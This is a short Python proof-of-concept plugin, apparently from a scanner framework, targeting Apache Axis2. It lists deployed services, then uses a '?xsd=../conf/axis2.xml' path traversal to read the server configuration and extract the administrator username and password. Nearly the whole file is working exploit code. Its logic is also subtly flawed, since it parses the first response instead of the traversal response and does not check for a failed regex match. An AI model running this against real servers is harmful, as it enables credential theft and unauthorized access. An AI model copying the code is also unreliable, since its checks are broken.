#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

import re
from script import Script, SERVER_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.server_type = SERVER_PORT_MAP.WEB
        self.name = 'axis2_download'
        self.keyword = ['axis2']
        self.info = 'axis2 download'
        self.type = 'download'
        self.level = 'high'
        Script.__init__(self, target=target, server_type=self.server_type)

    def prove(self):
        self.get_url()
        if self.base_url:
            path_list = list(set([
                self.url_normpath(self.base_url, '/axis2/services/'),
                self.url_normpath(self.base_url, './services/'),
            ]))
            for path in path_list:
                url = path + '/listServices'
                res = self.curl('get', url)
                if res :
                    m = re.search('\/axis2\/services\/(.*?)\?wsdl">.*?<\/a>', res.text)
                    if m.group(1):
                        server_str = m.group(1)
                        read_url = path + '/%s?xsd=../conf/axis2.xml' % (server_str)
                        res1 = self.curl('get', read_url)
                        if 'axisconfig' in str(res.html):
                            user = re.search('<parameter name="userName">(.*?)</parameter>', res.html)
                            password = re.search('<parameter name="password">(.*?)</parameter>', res.html)
                            self.flag = 1
                            self.req.append({"info": "info"})
                            self.res.append({"info": read_url, "key": ":".join([user.group(1), password.group(1)])})
                            break